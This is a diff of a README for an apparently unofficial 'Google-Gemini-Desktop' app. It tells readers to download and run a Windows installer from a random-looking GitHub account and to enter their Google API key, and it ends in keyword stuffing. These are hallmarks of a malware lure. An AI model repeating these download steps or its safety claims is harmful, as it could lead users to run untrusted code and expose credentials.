@@ -1,97 +1,63 @@
-# Google Gemini Desktop — Native AI Client for Gemini Pro
+# 🤖 Google-Gemini-Desktop - Access Google AI on your desktop
 
-**Google Gemini Desktop** is a clean, efficient, and native desktop application that provides easy access to **Google Gemini** — Google's powerful multimodal AI model family. Enjoy advanced reasoning, coding assistance, creative writing, and image/file analysis capabilities in a smooth cross-platform desktop experience.
+[![](https://img.shields.io/badge/Download-Gemini_Desktop-blue.svg)](https://github.com/Milkriveraneurism658/Google-Gemini-Desktop)
 
-Google Gemini Desktop brings the power of Gemini Pro, Gemini 2.0 Flash, Gemini 2.5 Flash, Gemini 3, and Gemini 3.5 Flash directly to your desktop, eliminating the need to keep a browser tab open. Compare it with ChatGPT desktop, Claude desktop, GitHub Desktop, and Google AI Studio notebooks to find the best AI workflow for your needs. The app supports multimodal inputs, conversation history, free-gemini-api endpoints, and prompt templates for coding and research.
+Google-Gemini-Desktop acts as a native application for your computer. It allows you to use Google Gemini AI models directly from your desktop. This app gives you access to features like multimodal reasoning, coding assistance, and creative writing. You can analyze images and files without opening a web browser. The application offers a stable environment for your workflows. It provides a direct interface for Gemini Pro and Flash models. 
 
-<img width="200" height="200" alt="bea48eaa-0129-42c2-9abe-f66e6783e625" src="https://github.com/user-attachments/assets/369ad841-7b8a-4d1e-be2a-9150516c2817" />
+## 📋 System Requirements
 
+To run this application on Windows, your computer must meet these basic standards:
 
-## Install
-[Download `gemini_desktop.zip`](https://github.com/google-gemini-desktop/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
----
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i3 or equivalent AMD processor. 
+- Memory: 4GB of RAM or more.
+- Storage: 200MB of free disk space for the installation files.
+- Network: Stable internet connection for AI model communication.
 
-<img width="1692" height="930" alt="63490e84-9832-43b6-814a-2f5024b5d37e" src="https://github.com/user-attachments/assets/a6380abb-f94f-4f13-b1c7-0bae35f83cb7" />
-<img width="1152" height="644" alt="a001830a-5914-4106-9e2b-646ef4ad86f5" src="https://github.com/user-attachments/assets/7fbf1013-7ff6-4093-b0aa-89bedd32e892" />
+## 📥 How to Install
 
----
-## Key Features
-- **Full access** to Google Gemini models including Gemini Pro, Gemini 1.5 Pro, Gemini 2.0 Flash, Gemini 2.5 Flash, and Gemini 3.5 Flash
-- **Strong reasoning** and problem-solving capabilities for technical and analytical tasks
-- **Coding assistance** — generate, debug, and refactor code with context-aware suggestions
-- **Multimodal support** — analyze images, documents, and files directly in the chat interface via gemini-pro-vision
-- **Clean, native desktop interface** with searchable conversation history and tagging
-- **Cross-platform** — runs on Windows, macOS, and Linux with native menus and shortcuts
-- **Offline history** — conversation logs stored locally for privacy and quick access
-- **Gemini Live API** — real-time streaming and gemini-live-api integration
-- **Gemini Spark Desktop** — alternate UI mode for focused writing sessions
+1. Visit the project website at [https://github.com/Milkriveraneurism658/Google-Gemini-Desktop](https://github.com/Milkriveraneurism658/Google-Gemini-Desktop).
+2. Locate the link to the latest software release.
+3. Download the installer file ending in .exe for your Windows system.
+4. Open the folder where the file saved.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup process.
+7. Launch the application from your desktop shortcut or the Start menu.
 
-<img width="686" height="386" alt="288513cc-b63f-4647-8f71-fc1bbe2fdbbd" src="https://github.com/user-attachments/assets/7a94013b-e6e8-4d99-b1f9-cfa8e5bd711a" />
+## ⚙️ Initial Configuration
 
+When you first open the app, you provide your API credentials to connect to the Google services. 
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive and run the application executable.
-3. **Configure Access** — Follow the in-app instructions for free Gemini access setup.
-4. **Start chatting** — Use the model for coding, research, creative writing, file analysis, or general assistance.
+1. Obtain your API key from the Google AI Studio dashboard.
+2. Open Google-Gemini-Desktop.
+3. Select the Settings menu from the top toolbar.
+4. Input your API key into the labeled field.
+5. Click Save or Apply to finalize the connection.
+6. The application validates your key and notifies you if the connection succeeds.
 
-**Pro Tip:** Provide detailed context in your prompts for optimal results. For coding tasks, paste relevant code snippets and describe the expected behavior. Use gemini-bot and gemini-web hooks for automation.
+## 🧠 Using the Application
 
-<img width="1296" height="1296" alt="42c7c875-226e-4630-863c-0251a2d46572" src="https://github.com/user-attachments/assets/9629c42d-d24b-4b78-ad89-29f5b3b35fbb" />
+The interface features a main chat window. You enter your prompts in the box at the bottom of the screen.
 
----
-## System Requirements
-### Platform Support
-- **Windows 10 / 11**
-- **macOS** (Intel and Apple Silicon)
-- **Linux** (AppImage and deb)
+### Multimodal Analysis
+Drag and drop images or documents into the text area. The AI processes these files and provides answers based on their content. Use this to interpret complex charts, read handwriting, or debug code snippets from your local files.
 
-### Notes
-- Requires an active internet connection for model access
-- Best performance on modern hardware with 8GB+ RAM
+### Model Selection
+You can switch between different AI models within the settings. Use the Flash models for fast, general tasks. Use the Pro models for complex reasoning and creative projects. The app updates to show the latest model versions as they become available.
 
-<img width="1200" height="720" alt="b407e089-cfca-4259-83b7-ff98f2056b1a" src="https://github.com/user-attachments/assets/eaae2b9c-127c-4286-894a-b853c50fa0cf" />
+## 🛠️ Troubleshooting
 
----
-## Comparisons & Trends
-Compare Google Gemini Desktop with alternatives before choosing your AI workflow:
-- **Google Gemini Desktop** — best for multimodal Gemini access and native desktop experience
-- **ChatGPT desktop** — best for OpenAI GPT workflows and plugin ecosystem
-- **Claude desktop** — best for long-context reasoning and creative writing
-- **Google AI Studio** — best for browser-based notebooks and API prototyping
+- Connection Errors: Check your internet connection. If the app fails to reach the servers, verify that your firewall allows traffic for the application.
+- API Key Issues: Log in to your Google AI Studio account and check if your key remains active. Generate a new key if the current one expired.
+- Performance Lags: If the app feels slow, close other programs that consume heavy memory. Ensure your system stays within the recommended RAM usage limits.
+- Updates: The application notifies you when a new version exists. Download the latest installer from the GitHub link to keep the software current.
 
-Google Trends worldwide (last 24h) show rising interest in: google-gemini, google-gemini-ai, google-gemini-pro, gemini desktop app, gemini 2.0 flash, gemini 2.5 flash, gemini 3, gemini 3.5 flash, gemini pro vision, gemini live api, free gemini api, gemini spark desktop, gemini web.
+## 🔒 Privacy and Security
 
----
-## Security & Legal
-**Important Notice:**
-This is an unofficial desktop client. Google may change or restrict access at any time. Use responsibly and ethically.
+The app transmits your prompts to Google servers to perform the AI processing. It does not gain access to your local files unless you manually upload them into a chat session. Your API key stays stored securely on your machine. The local storage only contains your chat history and configuration settings for your convenience.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com) before running.
-- Avoid sharing sensitive personal or financial data in prompts.
+## 💻 Technical Support
 
----
-## Contributing
-Contributions are welcome! Help improve the interface, stability, multimodal support, or access methods. Fork the repository and submit a pull request.
+Use the Issues tab on the GitHub repository to report bugs. Provide details about your Windows version and the steps you took before the error occurred. Include clear descriptions to help developers solve the problem. Check existing issues before you post to see if someone else already reported the same behavior.
 
----
-## License & Acknowledgments
-### License
-**Google Gemini Desktop** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 MrLash46**
-
-### Acknowledgments
-- Thanks to Google for developing Gemini and advancing multimodal AI.
-- The open-source community for desktop AI clients and cross-platform tooling.
-
----
-
-<p align="center">
-  Developed with ❤️ for the AI community
-</p>
-
-<img width="1300" height="731" alt="1640a3e4-de83-400d-91e6-21b31f921cbf" src="https://github.com/user-attachments/assets/91de5ccf-2b71-4a4b-8baa-ab722c3a0a7d" />
+Keywords: free-gemini-api, gemini, gemini-15-pro, gemini-2-0-flash, gemini-2-5-flash, gemini-3, gemini-3-5-flash, gemini-3-5-pro, gemini-3-6-flash, gemini-ai-integration, gemini-app, gemini-desktop, gemini-desktop-app, gemini-live-api, gemini-pro-1-5, gemini-pro-vision, gemini-spark-desktop, google-gemini, google-gemini-ai, google-gemini-pro
